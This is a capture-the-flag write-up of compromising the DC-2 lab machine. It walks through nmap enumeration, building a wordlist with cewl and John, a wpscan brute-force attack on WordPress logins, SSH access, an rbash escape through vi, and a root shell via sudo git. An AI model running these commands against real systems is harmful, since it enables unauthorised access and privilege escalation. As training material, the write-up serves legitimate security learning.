# DC-2
## Information Gathering
#### Ports/Services
80/tcp     http    
7744/tcp   ssh 

#### Credentials
- `jerry:adipiscing` 
- `tom:parturient` 

## Enumeration
### Nmap scan
```bash
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7744/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e/C1hLs6R0CH1fSWfpJ0x45g77ZaEn/nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB/QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1/xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN/aBITwGOIBGrp06w==
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH/VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf/QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud/SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR/PYR9
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE=
|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky/2s+wXTH
Aggressive OS guesses: Linux 3.11 - 4.1 (95%), Linux 3.16 (94%), Linux 4.4 (94%), Linux 3.13 (92%), Linux 3.2 - 3.8 (91%), IPFire 2.11 firewall (Linux 2.6.32) (91%), Linux 3.10 - 3.16 (91%), Linux 4.9 (90%), Linux 3.10 - 3.12 (90%), Linux 2.6.32 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

### 80/tcp
- Technologies
	- Apache 2.4.10
	- Wordpress
- Added domain name `dc-2` to `/etc/hosts`

- On the page `http://dc-2/index.php/flag/` there is a message 
```
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```
- I have webscraped the following URLs and ran them through JtR
	- /index.php/
		- `cewl http://dc-2 -m 6 -w webscrape-6.txt`
		- `john --wordlist=webscrape-6.txt --rules --stdout > webscrape_6_w_rules.txt`
	- /index.php/flag/
		- `cewl http://dc-2/index.php/flag/ -m 6 -w webscrape-6_flag_w-rules.txt`
		- `john --wordlist=webscrape-6_flag.txt --rules --stdout > webscrape_6_flag-w-rules.txt`


- Detecting users for wordpress
```bash
$ wpscan --url http://dc-2 -e u --plugins-detection mixed --output users-scan.txt
```
- Found some users
	- admin
	- Jerry Mouse (jerry)
	- tom

- Running dictattack with found usernames and password list
```bash
wpscan --url http://dc-2 --usernames users.txt --passwords wordlists/webscrape_6_flag_w-rules.txt
```
- Found the following:
	- `jerry:adipiscing` - TRUE POSITIVE
	- `tom:parturient` - TRUE POSITIVE

- At `http://dc-2/wp-admin/post.php?post=21&action=edit` there is a second flag
```
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```
- The only way to exploit WordPress with these low level accounts is to use an exploit of an outdated plugin/theme/3rd party component, etc.
- The 'other way'/'entry point' I can think of is the SSH service running on 7744
	- Attempting login to SSH service
		- `jerry:adipiscing` - FAILED
		- `tom:parturient`  - SUCCESS


## Exploitation
I am able to SSH into the machine using the credentials `tom:parturient`
```bash
ssh tom@192.168.70.194
```


## Privilege Escalation
- Dropping into the machine as `tom`; there are a few files here:
	- flag3.txt
	- local.txt
- flag3.txt contains
```
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```
- Attempting to use `su` shows that the application either doesn't exist or not in my path. I figure out that I am in a restricted shell (rbash). I also can't use absolute paths to execute files outside my path.
```bash
$ echo $SHELL
/bin/rbash
$ echo $PATH
/home/tom/usr/bin
$ ls usr/bin
less  ls  scp  vi
```
- There is a sneaky break out techique that you can use with `vi`
	- Once you launch `vi` you can break out of the rbash shell by performing the following:
		- `:set shell=/bin/bash`
		- `:shell`
	- This will drop you into a `/bin/bash` shell

- From here you can `su jerry` with the following credentials: `jerry:adipiscing`
- There is a file `flag4.txt` 
```
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```

- I look at what I am able to execute using sudo
```bash
$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```
- GTFOBins to the rescue 
```bash
$ sudo git -p help config
!/bin/bash
```
- This drops you into a root shell